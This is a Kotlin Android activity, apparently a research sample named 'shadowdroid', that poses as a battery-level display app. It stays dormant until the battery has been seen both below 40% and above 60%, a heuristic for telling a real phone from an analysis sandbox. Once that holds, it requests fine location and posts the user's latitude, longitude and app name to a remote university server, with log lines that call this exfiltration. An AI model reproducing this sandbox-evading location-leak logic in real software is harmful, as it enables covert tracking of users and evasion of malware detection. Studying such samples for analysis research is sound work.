package nl.tbethe.shadowdroid.batterylevel

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Bundle
import android.util.Log
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresPermission
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.edit
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "MainActivity"
private const val BELOW_THRESHOLD = "batteryLevelBelow"
private const val ABOVE_THRESHOLD = "batterLevelAbove"

class MainActivity : AppCompatActivity() {

    @SuppressLint("MissingPermission")
    val requestPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) sendLocation()
        }

    private lateinit var prefs : SharedPreferences
    private lateinit var textAbove : TextView
    private lateinit var textBelow : TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        prefs = getPreferences(Context.MODE_PRIVATE)
        textAbove = findViewById(R.id.above)
        textBelow = findViewById(R.id.below)

        val above = prefs.getBoolean(ABOVE_THRESHOLD, false)
        val below = prefs.getBoolean(BELOW_THRESHOLD, false)


        leakLocationIf(above && below)
    }

    override fun onStart() {
        super.onStart()

        val batteryLevel = queryBatteryLevel()
        batteryLevel?.let { lvl ->
            when {
                lvl < 40 -> prefs.edit {
                    putBoolean(BELOW_THRESHOLD, true)
                }
                lvl > 60 -> prefs.edit {
                    putBoolean(ABOVE_THRESHOLD, true)
                }
                else -> return@let
            }
        }
        updateUI()
    }

    override fun onResume() {
        super.onResume()

        val batteryLevel = queryBatteryLevel()
        batteryLevel?.let { lvl ->
            when {
                lvl < 40 -> prefs.edit {
                    putBoolean(BELOW_THRESHOLD, true)
                }
                lvl > 60 -> prefs.edit {
                    putBoolean(ABOVE_THRESHOLD, true)
                }
                else -> return@let
            }
        }
        updateUI()
    }

    /**
     * Returns current battery level
     */
    private fun queryBatteryLevel() : Int? {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            applicationContext.registerReceiver(null, filter)
        }
        return batteryStatus?.let { intent ->
            val level: Int = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale: Int = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            val scaledLevel : Float = (level.toFloat() / scale.toFloat()) * 100
            Log.d(TAG, "Level: $level, Scale: $scale. Battery level is: $scaledLevel")
            scaledLevel.toInt()
        }
    }

    /**
     * Updates the UI. Indicates whether
     */
    private fun updateUI() {
        this.textAbove.text = "Above: ${prefs.getBoolean(ABOVE_THRESHOLD, false)}"
        this.textBelow.text = "Below: ${prefs.getBoolean(BELOW_THRESHOLD, false)}"
    }

    private fun leakLocationIf(notAnalyser: Boolean) {
        if (!notAnalyser) return

        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            PackageManager.PERMISSION_DENIED -> {
                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            PackageManager.PERMISSION_GRANTED -> {
                sendLocation()
            }
        }
    }



    @RequiresPermission("android.permission.ACCESS_FINE_LOCATION")
    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val locationManager = getSystemService(LocationManager::class.java)
        val provider : String? = locationManager.getBestProvider(Criteria(), true)
        provider?.let {
            locationManager.requestSingleUpdate(provider, object : LocationListener {
                override fun onProviderEnabled(provider: String) {}

                override fun onProviderDisabled(provider: String) {}

                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

                override fun onLocationChanged(location: Location) {
                    val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            HttpClient(CIO).use { client ->
                                val response = client.submitForm<HttpResponse>(
                                    url,
                                    Parameters.build {
                                        append("appname", packageName)
                                        append("latitude", "${location.latitude}")
                                        append("longitude", "${location.longitude}")
                                    },
                                    false
                                )
                                Log.d(TAG, "Response status: ${response.status}")
                                Log.d(TAG, "Response: ${response.readText()}")
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                            e.printStackTrace()
                        }
                    }
                }

            }, null)
        } ?: Log.d(TAG, "No provider; cannot send location")
    }
}
